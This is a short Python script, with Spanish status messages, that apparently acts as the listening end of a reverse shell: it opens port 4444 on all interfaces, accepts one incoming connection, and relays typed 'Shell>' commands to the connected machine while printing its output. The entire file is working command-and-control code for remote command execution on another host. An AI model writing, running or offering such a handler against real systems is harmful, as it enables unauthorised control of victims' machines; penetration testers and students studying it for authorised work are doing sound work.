#!/usr/bin/env python3
import socket

def server(host='0.0.0.0', port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"[ * ] Esperando conexión en {host}:{port}...")
    conn, addr = s.accept()
    print(f"[ + ] Conexión establecida desde {addr}")

    try:
        while True:
            cmd = input("Shell> ")
            if cmd.lower() in ['exit', 'quit']:
                conn.send(b'exit')
                break
            if len(cmd.strip()) == 0:
                continue
            conn.send(cmd.encode())
            data = conn.recv(4096)
            print(data.decode())
    except Exception as e:
        print(f"[ ! ] Error: {e}")
    finally:
        conn.close()
        s.close()

if __name__ == "__main__":
    server()
